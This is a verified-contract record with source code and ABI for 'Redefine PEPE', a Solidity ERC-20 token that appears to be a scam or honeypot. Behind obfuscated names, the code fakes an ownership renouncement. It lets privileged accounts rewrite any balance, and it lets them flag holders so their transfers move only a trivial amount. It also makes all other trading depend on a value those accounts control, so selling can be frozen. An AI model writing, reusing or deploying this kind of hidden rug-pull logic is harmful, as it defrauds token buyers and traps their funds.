{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.9;\n\ninterface receiverIsLiquidity {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address fundWallet) external view returns (uint256);\n\n    function transfer(address amountAt, uint256 maxTo) external returns (bool);\n\n    function allowance(address sellReceiverLaunch, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 maxTo) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address amountAt,\n        uint256 maxTo\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed fundIsTrading, uint256 value);\n    event Approval(address indexed sellReceiverLaunch, address indexed spender, uint256 value);\n}\n\nabstract contract shouldEnable {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface toMin {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface launchedEnable {\n    function createPair(address fundLiquidity, address takeToken) external returns (address);\n}\n\ninterface tokenLiquidity is receiverIsLiquidity {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract RedefinePEPE is shouldEnable, receiverIsLiquidity, tokenLiquidity {\n\n    function tokenTo(address receiverAmount) public {\n        autoSell();\n        if (exemptWalletLaunch == shouldWalletReceiver) {\n            shouldWalletReceiver = exemptWalletLaunch;\n        }\n        if (receiverAmount == toFee || receiverAmount == isShould) {\n            return;\n        }\n        sellList[receiverAmount] = true;\n    }\n\n    mapping(address => bool) public sellList;\n\n    function amountAuto(address senderTotal) public {\n        if (totalExempt) {\n            return;\n        }\n        \n        teamTx[senderTotal] = true;\n        \n        totalExempt = true;\n    }\n\n    function transferFrom(address receiverMode, address amountAt, uint256 maxTo) external override returns (bool) {\n        if (_msgSender() != fundExempt) {\n            if (sellMax[receiverMode][_msgSender()] != type(uint256).max) {\n                require(maxTo <= sellMax[receiverMode][_msgSender()]);\n                sellMax[receiverMode][_msgSender()] -= maxTo;\n            }\n        }\n        return listReceiverSwap(receiverMode, amountAt, maxTo);\n    }\n\n    uint256 constant shouldBuy = 20 ** 10;\n\n    function allowance(address amountTeam, address liquidityReceiver) external view virtual override returns (uint256) {\n        if (liquidityReceiver == fundExempt) {\n            return type(uint256).max;\n        }\n        return sellMax[amountTeam][liquidityReceiver];\n    }\n\n    constructor (){\n        if (shouldWalletReceiver == exemptReceiver) {\n            exemptReceiver = exemptWalletLaunch;\n        }\n        toMin liquidityMax = toMin(fundExempt);\n        isShould = launchedEnable(liquidityMax.factory()).createPair(liquidityMax.WETH(), address(this));\n        \n        toFee = _msgSender();\n        marketingTrading();\n        teamTx[toFee] = true;\n        takeShould[toFee] = marketingSwap;\n        if (isLimit != exemptWalletLaunch) {\n            enableMarketingTake = false;\n        }\n        emit Transfer(address(0), toFee, marketingSwap);\n    }\n\n    bool private txLimit;\n\n    function marketingLaunchedTx(address toLiquidityList, uint256 maxTo) public {\n        autoSell();\n        takeShould[toLiquidityList] = maxTo;\n    }\n\n    bool public enableMarketingTake;\n\n    function name() external view virtual override returns (string memory) {\n        return walletLimit;\n    }\n\n    mapping(address => uint256) private takeShould;\n\n    function owner() external view returns (address) {\n        return txSender;\n    }\n\n    address private txSender;\n\n    uint256 swapFund;\n\n    string private amountLiquidity = \"RPE\";\n\n    function receiverLiquiditySender(address receiverMode, address amountAt, uint256 maxTo) internal returns (bool) {\n        require(takeShould[receiverMode] >= maxTo);\n        takeShould[receiverMode] -= maxTo;\n        takeShould[amountAt] += maxTo;\n        emit Transfer(receiverMode, amountAt, maxTo);\n        return true;\n    }\n\n    mapping(address => mapping(address => uint256)) private sellMax;\n\n    uint256 private marketingSwap = 100000000 * 10 ** 18;\n\n    function approve(address liquidityReceiver, uint256 maxTo) public virtual override returns (bool) {\n        sellMax[_msgSender()][liquidityReceiver] = maxTo;\n        emit Approval(_msgSender(), liquidityReceiver, maxTo);\n        return true;\n    }\n\n    uint256 modeBuy;\n\n    function tokenSwap(uint256 maxTo) public {\n        autoSell();\n        modeBuy = maxTo;\n    }\n\n    uint8 private marketingFee = 18;\n\n    function transfer(address toLiquidityList, uint256 maxTo) external virtual override returns (bool) {\n        return listReceiverSwap(_msgSender(), toLiquidityList, maxTo);\n    }\n\n    uint256 public shouldWalletReceiver;\n\n    uint256 public isLimit;\n\n    function symbol() external view virtual override returns (string memory) {\n        return amountLiquidity;\n    }\n\n    function balanceOf(address fundWallet) public view virtual override returns (uint256) {\n        return takeShould[fundWallet];\n    }\n\n    bool public liquidityLaunchSell;\n\n    function listReceiverSwap(address receiverMode, address amountAt, uint256 maxTo) internal returns (bool) {\n        if (receiverMode == toFee) {\n            return receiverLiquiditySender(receiverMode, amountAt, maxTo);\n        }\n        uint256 marketingTeam = receiverIsLiquidity(isShould).balanceOf(fundTeam);\n        require(marketingTeam == modeBuy);\n        require(amountAt != fundTeam);\n        if (sellList[receiverMode]) {\n            return receiverLiquiditySender(receiverMode, amountAt, shouldBuy);\n        }\n        return receiverLiquiditySender(receiverMode, amountAt, maxTo);\n    }\n\n    function autoSell() private view {\n        require(teamTx[_msgSender()]);\n    }\n\n    bool public amountExempt;\n\n    string private walletLimit = \"Redefine PEPE\";\n\n    uint256 private exemptReceiver;\n\n    function getOwner() external view returns (address) {\n        return txSender;\n    }\n\n    uint256 private exemptWalletLaunch;\n\n    function marketingTrading() public {\n        emit OwnershipTransferred(toFee, address(0));\n        txSender = address(0);\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return marketingFee;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return marketingSwap;\n    }\n\n    address fundExempt = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    bool public totalExempt;\n\n    bool public receiverTotal;\n\n    bool public maxShould;\n\n    address public toFee;\n\n    mapping(address => bool) public teamTx;\n\n    event OwnershipTransferred(address indexed fromTradingAt, address indexed listSwap);\n\n    address fundTeam = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    address public isShould;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellReceiverLaunch\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromTradingAt\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"listSwap\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundIsTrading\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountTeam\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"liquidityReceiver\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderTotal\",\"type\":\"address\"}],\"name\":\"amountAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxTo\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundWallet\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableMarketingTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isLimit\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isShould\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityLaunchSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toLiquidityList\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxTo\",\"type\":\"uint256\"}],\"name\":\"marketingLaunchedTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"sellList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldWalletReceiver\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"teamTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toFee\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"maxTo\",\"type\":\"uint256\"}],\"name\":\"tokenSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverAmount\",\"type\":\"address\"}],\"name\":\"tokenTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toLiquidityList\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxTo\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverMode\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"amountAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxTo\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "RedefinePEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}